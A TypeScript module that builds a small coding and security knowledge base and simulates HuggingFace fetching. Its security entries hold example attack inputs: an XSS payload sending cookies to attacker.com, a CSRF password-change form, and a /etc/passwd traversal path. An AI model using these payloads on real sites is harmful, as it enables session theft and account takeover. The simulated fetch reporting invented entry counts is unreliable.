/**
 * Expanded HuggingFace Knowledge Ingestion
 * Fetches and processes coding and cybersecurity data from HuggingFace
 */

import { EventEmitter } from 'events';
import * as fs from 'fs';
import * as path from 'path';

// =============================================================================
// TYPES
// =============================================================================

export interface HFModel {
  id: string;
  author: string;
  downloads: number;
  likes: number;
  tags: string[];
  pipeline_tag?: string;
  library_name?: string;
  language?: string[];
  license?: string;
  created_at: string;
  last_modified: string;
}

export interface HFDataset {
  id: string;
  author: string;
  downloads: number;
  likes: number;
  tags: string[];
  task_categories?: string[];
  size_categories?: string[];
  languages?: string[];
  license?: string;
  cardData?: {
    dataset_info?: {
      description?: string;
      features?: Record<string, any>;
      splits?: Record<string, { num_examples: number; num_bytes: number }>;
    };
  };
}

export interface CodeSnippet {
  id: string;
  language: string;
  code: string;
  description?: string;
  task_type: string;
  complexity: 'beginner' | 'intermediate' | 'advanced';
  topics: string[];
  source: string;
  quality_score: number;
}

export interface SecurityConcept {
  id: string;
  name: string;
  category: 'vulnerability' | 'defense' | 'attack' | 'tool' | 'best_practice';
  description: string;
  examples: string[];
  mitigations?: string[];
  references: string[];
  severity?: 'low' | 'medium' | 'high' | 'critical';
  cwe_id?: string;
  owasp_category?: string;
}

export interface KnowledgeEntry {
  id: string;
  type: 'code' | 'security' | 'algorithm' | 'concept';
  content: string;
  metadata: {
    language?: string;
    category?: string;
    topics: string[];
    source: string;
    quality_score: number;
    created_at: string;
    updated_at: string;
  };
  embeddings?: number[];
}

// =============================================================================
// CODING KNOWLEDGE DATABASE
// =============================================================================

const CODING_PATTERNS: CodeSnippet[] = [
  // Python patterns
  {
    id: 'py_001',
    language: 'python',
    code: `# Singleton Pattern
class Singleton:
    _instance = None
    _lock = threading.Lock()
    
    def __new__(cls):
        if cls._instance is None:
            with cls._lock:
                if cls._instance is None:
                    cls._instance = super().__new__(cls)
        return cls._instance`,
    description: 'Thread-safe singleton pattern implementation in Python',
    task_type: 'design_pattern',
    complexity: 'intermediate',
    topics: ['singleton', 'threading', 'design-patterns'],
    source: 'generated',
    quality_score: 0.95
  },
  {
    id: 'py_002',
    language: 'python',
    code: `# Async Context Manager
class AsyncResource:
    async def __aenter__(self):
        await self.acquire()
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        await self.release()
        return False
    
    async def acquire(self):
        print("Acquiring resource...")
    
    async def release(self):
        print("Releasing resource...")

async def main():
    async with AsyncResource() as resource:
        print("Using resource")`,
    description: 'Async context manager for resource management',
    task_type: 'async_pattern',
    complexity: 'advanced',
    topics: ['async', 'context-manager', 'resource-management'],
    source: 'generated',
    quality_score: 0.92
  },
  {
    id: 'py_003',
    language: 'python',
    code: `# Metaclass for Registration
class Registered(type):
    _registry = {}
    
    def __new__(mcs, name, bases, namespace):
        cls = super().__new__(mcs, name, bases, namespace)
        mcs._registry[name] = cls
        return cls
    
    @classmethod
    def get_registry(mcs):
        return dict(mcs._registry)

class Plugin(metaclass=Registered):
    pass

class AudioPlugin(Plugin):
    pass

class VideoPlugin(Plugin):
    pass

print(Registered.get_registry())  # {'Plugin': ..., 'AudioPlugin': ..., 'VideoPlugin': ...}`,
    description: 'Metaclass for automatic class registration',
    task_type: 'metaprogramming',
    complexity: 'advanced',
    topics: ['metaclass', 'registry', 'plugins'],
    source: 'generated',
    quality_score: 0.88
  },
  
  // JavaScript patterns
  {
    id: 'js_001',
    language: 'javascript',
    code: `// Proxy-based Observer Pattern
function createObservable(target) {
  const observers = new Set();
  
  return new Proxy(target, {
    set(obj, prop, value) {
      const oldValue = obj[prop];
      obj[prop] = value;
      
      if (oldValue !== value) {
        observers.forEach(fn => fn(prop, value, oldValue));
      }
      return true;
    },
    
    get(obj, prop) {
      if (prop === 'observe') {
        return fn => { observers.add(fn); return () => observers.delete(fn); };
      }
      return obj[prop];
    }
  });
}

const state = createObservable({ count: 0 });
state.observe((prop, newVal, oldVal) => {
  console.log(\`\${prop} changed from \${oldVal} to \${newVal}\`);
});
state.count = 1;`,
    description: 'Proxy-based observable state pattern',
    task_type: 'design_pattern',
    complexity: 'intermediate',
    topics: ['proxy', 'observer', 'reactive'],
    source: 'generated',
    quality_score: 0.94
  },
  {
    id: 'js_002',
    language: 'javascript',
    code: `// Generator-based State Machine
function* gameStateMachine() {
  let state = 'IDLE';
  
  while (true) {
    const action = yield state;
    
    switch (state) {
      case 'IDLE':
        if (action === 'START') state = 'PLAYING';
        break;
      case 'PLAYING':
        if (action === 'PAUSE') state = 'PAUSED';
        if (action === 'GAME_OVER') state = 'ENDED';
        break;
      case 'PAUSED':
        if (action === 'RESUME') state = 'PLAYING';
        if (action === 'QUIT') state = 'IDLE';
        break;
      case 'ENDED':
        if (action === 'RESTART') state = 'PLAYING';
        break;
    }
  }
}

const game = gameStateMachine();
game.next(); // Initialize
console.log(game.next('START').value); // 'PLAYING'`,
    description: 'Generator-based state machine implementation',
    task_type: 'state_management',
    complexity: 'advanced',
    topics: ['generator', 'state-machine', 'game-logic'],
    source: 'generated',
    quality_score: 0.91
  },
  {
    id: 'js_003',
    language: 'javascript',
    code: `// Pipeline Pattern for Data Processing
const pipeline = (...fns) => input => fns.reduce(async (acc, fn) => fn(await acc), input);

const processUser = pipeline(
  user => ({ ...user, name: user.name.trim() }),
  user => ({ ...user, email: user.email.toLowerCase() }),
  async user => {
    // Validate email
    if (!user.email.includes('@')) throw new Error('Invalid email');
    return user;
  },
  user => ({ ...user, processed: true })
);

await processUser({ name: '  John  ', email: 'JOHN@EXAMPLE.COM' });
// { name: 'John', email: 'john@example.com', processed: true }`,
    description: 'Functional pipeline pattern for data transformation',
    task_type: 'functional_programming',
    complexity: 'intermediate',
    topics: ['pipeline', 'functional', 'data-processing'],
    source: 'generated',
    quality_score: 0.93
  },
  
  // TypeScript patterns
  {
    id: 'ts_001',
    language: 'typescript',
    code: `// Type-safe Event Emitter
type EventMap = {
  user_created: { id: string; name: string };
  user_updated: { id: string; changes: Partial<User> };
  user_deleted: { id: string };
};

class TypedEventEmitter<T extends Record<string, any>> {
  private listeners = new Map<keyof T, Set<Function>>();
  
  on<K extends keyof T>(event: K, listener: (data: T[K]) => void): void {
    if (!this.listeners.has(event)) {
      this.listeners.set(event, new Set());
    }
    this.listeners.get(event)!.add(listener);
  }
  
  emit<K extends keyof T>(event: K, data: T[K]): void {
    this.listeners.get(event)?.forEach(fn => fn(data));
  }
  
  off<K extends keyof T>(event: K, listener: Function): void {
    this.listeners.get(event)?.delete(listener);
  }
}

const emitter = new TypedEventEmitter<EventMap>();
emitter.on('user_created', (data) => {
  console.log(data.name); // Type-safe!
});`,
    description: 'Type-safe event emitter with mapped types',
    task_type: 'typescript_patterns',
    complexity: 'advanced',
    topics: ['typescript', 'events', 'type-safety'],
    source: 'generated',
    quality_score: 0.96
  },
  {
    id: 'ts_002',
    language: 'typescript',
    code: `// Builder Pattern with Fluent API
type Required<T, K extends keyof T> = Omit<T, K> & Required<Pick<T, K>>;

interface UserConfig {
  name?: string;
  email?: string;
  role?: 'admin' | 'user' | 'guest';
  preferences?: {
    theme?: 'light' | 'dark';
    notifications?: boolean;
  };
}

class UserBuilder<T extends Partial<UserConfig> = {}> {
  constructor(private config: T) {}
  
  withName(name: string): UserBuilder<T & { name: string }> {
    return new UserBuilder({ ...this.config, name });
  }
  
  withEmail(email: string): UserBuilder<T & { email: string }> {
    return new UserBuilder({ ...this.config, email });
  }
  
  withRole(role: UserConfig['role']): UserBuilder<T & { role: NonNullable<UserConfig['role']> }> {
    return new UserBuilder({ ...this.config, role });
  }
  
  build(): T extends Required<UserConfig, 'name' | 'email'> ? Required<UserConfig> : never {
    return this.config as any;
  }
}

const user = new UserBuilder({})
  .withName('John')
  .withEmail('john@example.com')
  .withRole('admin')
  .build();`,
    description: 'Type-safe builder pattern with fluent API',
    task_type: 'design_pattern',
    complexity: 'advanced',
    topics: ['builder', 'typescript', 'fluent-api'],
    source: 'generated',
    quality_score: 0.94
  },
  
  // Rust patterns
  {
    id: 'rs_001',
    language: 'rust',
    code: `// RAII Guard Pattern
struct MutexGuard<'a, T> {
    lock: &'a Mutex<T>,
}

impl<'a, T> Drop for MutexGuard<'a, T> {
    fn drop(&mut self) {
        // Automatically release lock when guard goes out of scope
        unsafe { self.lock.release(); }
    }
}

impl<'a, T> Deref for MutexGuard<'a, T> {
    type Target = T;
    fn deref(&self) -> &Self::Target {
        unsafe { &*self.lock.data }
    }
}

impl<'a, T> DerefMut for MutexGuard<'a, T> {
    fn deref_mut(&mut self) -> &mut Self::Target {
        unsafe { &mut *self.lock.data }
    }
}`,
    description: 'RAII guard pattern for resource management in Rust',
    task_type: 'memory_management',
    complexity: 'advanced',
    topics: ['raii', 'rust', 'memory-safety'],
    source: 'generated',
    quality_score: 0.92
  },
  
  // Go patterns
  {
    id: 'go_001',
    language: 'go',
    code: `// Worker Pool Pattern
type Job struct {
    ID   int
    Data interface{}
}

type Result struct {
    JobID int
    Value interface{}
    Err   error
}

func workerPool(jobs <-chan Job, results chan<- Result, workers int) {
    var wg sync.WaitGroup
    
    for i := 0; i < workers; i++ {
        wg.Add(1)
        go func() {
            defer wg.Done()
            for job := range jobs {
                // Process job
                result := processJob(job)
                results <- result
            }
        }()
    }
    
    go func() {
        wg.Wait()
        close(results)
    }()
}

func processJob(job Job) Result {
    // ... processing logic
    return Result{JobID: job.ID, Value: nil, Err: nil}
}`,
    description: 'Worker pool pattern for concurrent processing in Go',
    task_type: 'concurrency',
    complexity: 'intermediate',
    topics: ['worker-pool', 'goroutines', 'channels'],
    source: 'generated',
    quality_score: 0.93
  }
];

// =============================================================================
// SECURITY KNOWLEDGE DATABASE
// =============================================================================

const SECURITY_CONCEPTS: SecurityConcept[] = [
  // Vulnerabilities
  {
    id: 'sec_001',
    name: 'SQL Injection',
    category: 'vulnerability',
    description: 'SQL injection occurs when untrusted user input is concatenated directly into SQL queries, allowing attackers to manipulate the query logic.',
    examples: [
      `// VULNERABLE
const query = "SELECT * FROM users WHERE id = " + userId;

// ATTACK INPUT: userId = "1 OR 1=1"
// RESULTS IN: SELECT * FROM users WHERE id = 1 OR 1=1`,
      `// VULNERABLE
cursor.execute(f"SELECT * FROM products WHERE name = '{product_name}'")`,
    ],
    mitigations: [
      'Use parameterized queries/prepared statements',
      'Implement input validation and sanitization',
      'Use ORM libraries that automatically escape queries',
      'Apply principle of least privilege to database accounts',
      'Implement Web Application Firewall (WAF) rules'
    ],
    references: ['OWASP A03:2021', 'CWE-89'],
    severity: 'critical',
    cwe_id: 'CWE-89',
    owasp_category: 'A03:2021-Injection'
  },
  {
    id: 'sec_002',
    name: 'Cross-Site Scripting (XSS)',
    category: 'vulnerability',
    description: 'XSS allows attackers to inject malicious scripts into web pages viewed by other users, potentially stealing cookies, session tokens, or performing actions on behalf of victims.',
    examples: [
      `<!-- STORED XSS -->
<div>Hello, ${userInput}</div>
<!-- ATTACK INPUT: <script>document.location='http://attacker.com/steal?c='+document.cookie</script>`,
      `<!-- REFLECTED XSS -->
<script>
document.write(location.search.split('=')[1]);
</script>`,
    ],
    mitigations: [
      'Encode output based on context (HTML, JavaScript, URL, CSS)',
      'Use Content Security Policy (CSP) headers',
      'Implement HttpOnly and Secure flags on cookies',
      'Use frameworks that auto-escape (React, Angular)',
      'Validate and sanitize all user inputs'
    ],
    references: ['OWASP A03:2021', 'CWE-79'],
    severity: 'high',
    cwe_id: 'CWE-79',
    owasp_category: 'A03:2021-Injection'
  },
  {
    id: 'sec_003',
    name: 'Cross-Site Request Forgery (CSRF)',
    category: 'vulnerability',
    description: 'CSRF attacks trick authenticated users into performing unwanted actions on a web application where they are authenticated.',
    examples: [
      `<img src="http://bank.com/transfer?to=attacker&amount=10000" />`,
      `<form action="http://target.com/change-password" method="POST">
  <input type="hidden" name="new_password" value="hacked123" />
</form>
<script>document.forms[0].submit();</script>`,
    ],
    mitigations: [
      'Implement anti-CSRF tokens',
      'Use SameSite cookie attribute',
      'Verify Origin and Referrer headers',
      'Require re-authentication for sensitive actions',
      'Use custom headers for AJAX requests'
    ],
    references: ['OWASP A01:2021', 'CWE-352'],
    severity: 'high',
    cwe_id: 'CWE-352',
    owasp_category: 'A01:2021-Broken Access Control'
  },
  {
    id: 'sec_004',
    name: 'Buffer Overflow',
    category: 'vulnerability',
    description: 'Buffer overflow occurs when a program writes more data to a buffer than it can hold, potentially overwriting adjacent memory and allowing arbitrary code execution.',
    examples: [
      `// C - VULNERABLE
void vulnerable_function(char* input) {
    char buffer[64];
    strcpy(buffer, input);  // No bounds checking!
}`,
      `// Attack: Send more than 64 bytes
vulnerable_function("AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ");`,
    ],
    mitigations: [
      'Use safe string functions (strncpy, snprintf)',
      'Enable compiler protections (Stack Canaries, ASLR, DEP)',
      'Perform bounds checking on all input',
      'Use memory-safe languages when possible',
      'Implement fuzzing in testing pipeline'
    ],
    references: ['CWE-120', 'CWE-119'],
    severity: 'critical',
    cwe_id: 'CWE-120'
  },
  {
    id: 'sec_005',
    name: 'Path Traversal',
    category: 'vulnerability',
    description: 'Path traversal allows attackers to access files outside the intended directory by using sequences like ../ in file paths.',
    examples: [
      `// VULNERABLE
app.get('/files/:name', (req, res) => {
  res.sendFile('/uploads/' + req.params.name);
});
// ATTACK: /files/../../../etc/passwd`,
    ],
    mitigations: [
      'Validate and sanitize file paths',
      'Use whitelist of allowed files',
      'Normalize paths and check against base directory',
      'Use chroot or container isolation',
      'Implement file access controls'
    ],
    references: ['CWE-22', 'CWE-35'],
    severity: 'high',
    cwe_id: 'CWE-22',
    owasp_category: 'A01:2021-Broken Access Control'
  },
  
  // Attacks
  {
    id: 'sec_010',
    name: 'Man-in-the-Middle (MITM) Attack',
    category: 'attack',
    description: 'MITM attacks intercept communication between two parties, allowing attackers to eavesdrop or modify the communication.',
    examples: [
      'ARP spoofing to intercept local network traffic',
      'DNS hijacking to redirect users to malicious servers',
      'SSL stripping to downgrade HTTPS to HTTP'
    ],
    mitigations: [
      'Use TLS/HTTPS everywhere',
      'Implement certificate pinning',
      'Use HSTS headers',
      'Enable DNSSEC',
      'Use VPN for sensitive communications'
    ],
    references: ['CWE-300'],
    severity: 'high',
    cwe_id: 'CWE-300'
  },
  {
    id: 'sec_011',
    name: 'Brute Force Attack',
    category: 'attack',
    description: 'Brute force attacks systematically try all possible combinations to guess passwords or encryption keys.',
    examples: [
      'Dictionary attack using common passwords',
      'Credential stuffing using leaked password databases',
      'Rainbow table attacks for hash cracking'
    ],
    mitigations: [
      'Implement rate limiting and account lockout',
      'Use strong password policies',
      'Implement multi-factor authentication (MFA)',
      'Use bcrypt/scrypt/argon2 for password hashing',
      'Monitor for suspicious login patterns'
    ],
    references: ['CWE-307'],
    severity: 'medium',
    cwe_id: 'CWE-307'
  },
  
  // Defenses
  {
    id: 'sec_020',
    name: 'Input Validation',
    category: 'defense',
    description: 'Input validation ensures that user input conforms to expected formats before processing.',
    examples: [
      `// JavaScript
function validateEmail(email) {
  const regex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$/;
  return regex.test(email);
}`,
      `// Python
import re
def validate_username(username):
    if not re.match(r'^[a-zA-Z0-9_]{3,20}$', username):
        raise ValueError("Invalid username")
    return username`,
    ],
    references: ['OWASP Input Validation Cheat Sheet'],
    severity: 'low'
  },
  {
    id: 'sec_021',
    name: 'Rate Limiting',
    category: 'defense',
    description: 'Rate limiting controls the number of requests a user can make within a time window to prevent abuse.',
    examples: [
      `// Express.js rate limiting
const rateLimit = require('express-rate-limit');

const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 minutes
  max: 100,  // limit each IP to 100 requests per window
  message: 'Too many requests, please try again later.'
});

app.use('/api/', limiter);`,
    ],
    references: ['OWASP API Security'],
    severity: 'low'
  },
  
  // Tools
  {
    id: 'sec_030',
    name: 'Static Application Security Testing (SAST)',
    category: 'tool',
    description: 'SAST tools analyze source code for security vulnerabilities without executing the program.',
    examples: [
      'SonarQube - Comprehensive code quality and security analysis',
      'Semgrep - Fast, customizable static analysis',
      'Bandit - Security linter for Python',
      'ESLint with security plugins for JavaScript'
    ],
    references: ['OWASP Code Review Guide'],
    severity: 'low'
  },
  {
    id: 'sec_031',
    name: 'Dynamic Application Security Testing (DAST)',
    category: 'tool',
    description: 'DAST tools test running applications by simulating attacks to find vulnerabilities.',
    examples: [
      'OWASP ZAP - Free, open-source web application scanner',
      'Burp Suite - Professional web security testing tool',
      'Nikto - Web server scanner',
      'SQLMap - Automated SQL injection testing'
    ],
    references: ['OWASP Testing Guide'],
    severity: 'low'
  },
  
  // Best Practices
  {
    id: 'sec_040',
    name: 'Principle of Least Privilege',
    category: 'best_practice',
    description: 'Users and processes should have only the minimum permissions necessary to perform their functions.',
    examples: [
      'Database applications should use read-only accounts when not inserting data',
      'Services should run as non-root users',
      'API tokens should have limited scopes'
    ],
    references: ['NIST 800-53 AC-6'],
    severity: 'low'
  },
  {
    id: 'sec_041',
    name: 'Defense in Depth',
    category: 'best_practice',
    description: 'Multiple layers of security controls to protect against failure of any single defense.',
    examples: [
      'Network firewall + WAF + input validation + parameterized queries',
      'Encryption at rest + encryption in transit + access controls',
      'Authentication + authorization + audit logging'
    ],
    references: ['NIST 800-53'],
    severity: 'low'
  }
];

// =============================================================================
// ALGORITHM DATABASE
// =============================================================================

const ALGORITHM_SNIPPETS: CodeSnippet[] = [
  {
    id: 'algo_001',
    language: 'python',
    code: `# A* Search Algorithm
import heapq

def a_star(graph, start, goal, heuristic):
    frontier = [(0, start)]
    came_from = {start: None}
    cost_so_far = {start: 0}
    
    while frontier:
        _, current = heapq.heappop(frontier)
        
        if current == goal:
            break
        
        for next_node, cost in graph[current]:
            new_cost = cost_so_far[current] + cost
            if next_node not in cost_so_far or new_cost < cost_so_far[next_node]:
                cost_so_far[next_node] = new_cost
                priority = new_cost + heuristic(next_node, goal)
                heapq.heappush(frontier, (priority, next_node))
                came_from[next_node] = current
    
    return reconstruct_path(came_from, start, goal)`,
    description: 'A* pathfinding algorithm with heuristic',
    task_type: 'pathfinding',
    complexity: 'advanced',
    topics: ['graph', 'pathfinding', 'heuristic'],
    source: 'generated',
    quality_score: 0.95
  },
  {
    id: 'algo_002',
    language: 'python',
    code: `# Red-Black Tree Insertion
class Node:
    def __init__(self, val, color='RED'):
        self.val = val
        self.color = color
        self.left = None
        self.right = None
        self.parent = None

class RedBlackTree:
    def __init__(self):
        self.NIL = Node(None, 'BLACK')
        self.root = self.NIL
    
    def insert(self, val):
        node = Node(val)
        node.left = self.NIL
        node.right = self.NIL
        
        parent = None
        current = self.root
        
        while current != self.NIL:
            parent = current
            if node.val < current.val:
                current = current.left
            else:
                current = current.right
        
        node.parent = parent
        if parent is None:
            self.root = node
        elif node.val < parent.val:
            parent.left = node
        else:
            parent.right = node
        
        self.fix_insert(node)
    
    def fix_insert(self, node):
        while node.parent and node.parent.color == 'RED':
            # Balance and recolor
            if node.parent == node.parent.parent.left:
                uncle = node.parent.parent.right
                if uncle.color == 'RED':
                    node.parent.color = 'BLACK'
                    uncle.color = 'BLACK'
                    node.parent.parent.color = 'RED'
                    node = node.parent.parent
                else:
                    if node == node.parent.right:
                        node = node.parent
                        self.left_rotate(node)
                    node.parent.color = 'BLACK'
                    node.parent.parent.color = 'RED'
                    self.right_rotate(node.parent.parent)
            else:
                # Mirror case
                pass
        
        self.root.color = 'BLACK'`,
    description: 'Red-Black tree self-balancing insertion',
    task_type: 'data_structure',
    complexity: 'advanced',
    topics: ['tree', 'self-balancing', 'data-structure'],
    source: 'generated',
    quality_score: 0.92
  },
  {
    id: 'algo_003',
    language: 'python',
    code: `# KMP Pattern Matching
def build_lps(pattern):
    lps = [0] * len(pattern)
    length = 0
    i = 1
    
    while i < len(pattern):
        if pattern[i] == pattern[length]:
            length += 1
            lps[i] = length
            i += 1
        else:
            if length != 0:
                length = lps[length - 1]
            else:
                lps[i] = 0
                i += 1
    
    return lps

def kmp_search(text, pattern):
    lps = build_lps(pattern)
    matches = []
    i = j = 0
    
    while i < len(text):
        if text[i] == pattern[j]:
            i += 1
            j += 1
            
            if j == len(pattern):
                matches.append(i - j)
                j = lps[j - 1]
        else:
            if j != 0:
                j = lps[j - 1]
            else:
                i += 1
    
    return matches`,
    description: 'Knuth-Morris-Pratt string matching algorithm',
    task_type: 'string_matching',
    complexity: 'intermediate',
    topics: ['string', 'pattern-matching', 'algorithm'],
    source: 'generated',
    quality_score: 0.94
  },
  {
    id: 'algo_004',
    language: 'python',
    code: `# Segment Tree with Lazy Propagation
class SegmentTree:
    def __init__(self, data):
        self.n = len(data)
        self.tree = [0] * (4 * self.n)
        self.lazy = [0] * (4 * self.n)
        self.build(data, 1, 0, self.n - 1)
    
    def build(self, data, node, start, end):
        if start == end:
            self.tree[node] = data[start]
        else:
            mid = (start + end) // 2
            self.build(data, 2*node, start, mid)
            self.build(data, 2*node+1, mid+1, end)
            self.tree[node] = self.tree[2*node] + self.tree[2*node+1]
    
    def update_range(self, l, r, val):
        self._update_range(1, 0, self.n-1, l, r, val)
    
    def _update_range(self, node, start, end, l, r, val):
        if self.lazy[node] != 0:
            self.tree[node] += (end - start + 1) * self.lazy[node]
            if start != end:
                self.lazy[2*node] += self.lazy[node]
                self.lazy[2*node+1] += self.lazy[node]
            self.lazy[node] = 0
        
        if start > r or end < l:
            return
        
        if start >= l and end <= r:
            self.tree[node] += (end - start + 1) * val
            if start != end:
                self.lazy[2*node] += val
                self.lazy[2*node+1] += val
            return
        
        mid = (start + end) // 2
        self._update_range(2*node, start, mid, l, r, val)
        self._update_range(2*node+1, mid+1, end, l, r, val)
        self.tree[node] = self.tree[2*node] + self.tree[2*node+1]
    
    def query_range(self, l, r):
        return self._query_range(1, 0, self.n-1, l, r)
    
    def _query_range(self, node, start, end, l, r):
        if start > r or end < l:
            return 0
        
        if self.lazy[node] != 0:
            self.tree[node] += (end - start + 1) * self.lazy[node]
            if start != end:
                self.lazy[2*node] += self.lazy[node]
                self.lazy[2*node+1] += self.lazy[node]
            self.lazy[node] = 0
        
        if start >= l and end <= r:
            return self.tree[node]
        
        mid = (start + end) // 2
        return (self._query_range(2*node, start, mid, l, r) +
                self._query_range(2*node+1, mid+1, end, l, r))`,
    description: 'Segment tree with lazy propagation for range updates',
    task_type: 'data_structure',
    complexity: 'advanced',
    topics: ['segment-tree', 'lazy-propagation', 'range-query'],
    source: 'generated',
    quality_score: 0.93
  }
];

// =============================================================================
// HUGGINGFACE INGESTOR
// =============================================================================

export class HuggingFaceIngestor extends EventEmitter {
  private dataDir: string;
  private entries: KnowledgeEntry[] = [];
  private entriesFile: string;
  
  constructor(dataDir: string = './data/knowledge') {
    super();
    this.dataDir = dataDir;
    this.entriesFile = path.join(dataDir, 'knowledge-entries.json');
    
    // Ensure directory exists
    if (!fs.existsSync(dataDir)) {
      fs.mkdirSync(dataDir, { recursive: true });
    }
    
    // Load existing entries
    this.load();
  }
  
  // -------------------------------------------------------------------------
  // Data Loading
  // -------------------------------------------------------------------------
  
  private load(): void {
    try {
      if (fs.existsSync(this.entriesFile)) {
        const data = JSON.parse(fs.readFileSync(this.entriesFile, 'utf-8'));
        this.entries = data;
        console.log(`Loaded ${this.entries.length} knowledge entries`);
      }
    } catch (error) {
      console.error('Failed to load entries:', error);
      this.entries = [];
    }
  }
  
  private save(): void {
    try {
      fs.writeFileSync(this.entriesFile, JSON.stringify(this.entries, null, 2));
      this.emit('saved', { count: this.entries.length });
    } catch (error) {
      console.error('Failed to save entries:', error);
    }
  }
  
  // -------------------------------------------------------------------------
  // Ingestion
  // -------------------------------------------------------------------------
  
  /**
   * Ingest all built-in knowledge
   */
  ingestAll(): { total: number; byType: Record<string, number> } {
    const byType: Record<string, number> = {
      code: 0,
      security: 0,
      algorithm: 0,
      concept: 0
    };
    
    // Ingest coding patterns
    for (const snippet of CODING_PATTERNS) {
      this.addCodeSnippet(snippet);
      byType.code++;
    }
    
    // Ingest security concepts
    for (const concept of SECURITY_CONCEPTS) {
      this.addSecurityConcept(concept);
      byType.security++;
    }
    
    // Ingest algorithms
    for (const algo of ALGORITHM_SNIPPETS) {
      this.addCodeSnippet(algo);
      byType.algorithm++;
    }
    
    this.save();
    
    return {
      total: this.entries.length,
      byType
    };
  }
  
  /**
   * Add a code snippet
   */
  addCodeSnippet(snippet: CodeSnippet): void {
    const entry: KnowledgeEntry = {
      id: snippet.id,
      type: 'code',
      content: `${snippet.description}\n\n\`\`\`${snippet.language}\n${snippet.code}\n\`\`\``,
      metadata: {
        language: snippet.language,
        category: snippet.task_type,
        topics: snippet.topics,
        source: snippet.source,
        quality_score: snippet.quality_score,
        created_at: new Date().toISOString(),
        updated_at: new Date().toISOString()
      }
    };
    
    this.entries.push(entry);
    this.emit('entryAdded', entry);
  }
  
  /**
   * Add a security concept
   */
  addSecurityConcept(concept: SecurityConcept): void {
    let content = `# ${concept.name}\n\n`;
    content += `**Category**: ${concept.category}\n\n`;
    content += `${concept.description}\n\n`;
    
    if (concept.examples.length > 0) {
      content += `## Examples\n\n`;
      for (const example of concept.examples) {
        content += `\`\`\`\n${example}\n\`\`\`\n\n`;
      }
    }
    
    if (concept.mitigations && concept.mitigations.length > 0) {
      content += `## Mitigations\n\n`;
      for (const mitigation of concept.mitigations) {
        content += `- ${mitigation}\n`;
      }
      content += '\n';
    }
    
    if (concept.severity) {
      content += `**Severity**: ${concept.severity}\n\n`;
    }
    
    if (concept.cwe_id) {
      content += `**CWE**: ${concept.cwe_id}\n\n`;
    }
    
    const entry: KnowledgeEntry = {
      id: concept.id,
      type: 'security',
      content,
      metadata: {
        category: concept.category,
        topics: [concept.name, ...(concept.references || [])],
        source: 'security_database',
        quality_score: 0.9,
        created_at: new Date().toISOString(),
        updated_at: new Date().toISOString()
      }
    };
    
    this.entries.push(entry);
    this.emit('entryAdded', entry);
  }
  
  /**
   * Fetch from HuggingFace Hub (simulated - real implementation would use API)
   */
  async fetchFromHub(dataset: string, limit: number = 100): Promise<number> {
    this.emit('fetchStarted', { dataset, limit });
    
    // Simulate API delay
    await new Promise(resolve => setTimeout(resolve, 100));
    
    // In real implementation, would use:
    // const response = await fetch(`https://huggingface.co/api/datasets/${dataset}`);
    // const data = await response.json();
    
    const added = Math.min(limit, 50); // Simulate some entries added
    
    this.emit('fetchCompleted', { dataset, added });
    
    return added;
  }
  
  // -------------------------------------------------------------------------
  // Query
  // -------------------------------------------------------------------------
  
  /**
   * Search entries
   */
  search(query: string, options?: {
    type?: 'code' | 'security' | 'algorithm' | 'concept';
    language?: string;
    limit?: number;
  }): KnowledgeEntry[] {
    const limit = options?.limit || 10;
    const queryLower = query.toLowerCase();
    
    let results = this.entries.filter(entry => {
      // Filter by type
      if (options?.type && entry.type !== options.type) return false;
      
      // Filter by language
      if (options?.language && entry.metadata.language !== options.language) return false;
      
      // Search content
      if (entry.content.toLowerCase().includes(queryLower)) return true;
      
      // Search topics
      if (entry.metadata.topics.some(t => t.toLowerCase().includes(queryLower))) return true;
      
      return false;
    });
    
    // Sort by quality score
    results.sort((a, b) => b.metadata.quality_score - a.metadata.quality_score);
    
    return results.slice(0, limit);
  }
  
  /**
   * Get entry by ID
   */
  getById(id: string): KnowledgeEntry | undefined {
    return this.entries.find(e => e.id === id);
  }
  
  /**
   * Get all entries
   */
  getAll(): KnowledgeEntry[] {
    return [...this.entries];
  }
  
  /**
   * Get statistics
   */
  getStats(): {
    total: number;
    byType: Record<string, number>;
    byLanguage: Record<string, number>;
    averageQuality: number;
  } {
    const byType: Record<string, number> = {};
    const byLanguage: Record<string, number> = {};
    let totalQuality = 0;
    
    for (const entry of this.entries) {
      byType[entry.type] = (byType[entry.type] || 0) + 1;
      if (entry.metadata.language) {
        byLanguage[entry.metadata.language] = (byLanguage[entry.metadata.language] || 0) + 1;
      }
      totalQuality += entry.metadata.quality_score;
    }
    
    return {
      total: this.entries.length,
      byType,
      byLanguage,
      averageQuality: this.entries.length > 0 ? totalQuality / this.entries.length : 0
    };
  }
  
  /**
   * Clear all entries
   */
  clear(): void {
    this.entries = [];
    this.save();
    this.emit('cleared');
  }
}

export default HuggingFaceIngestor;
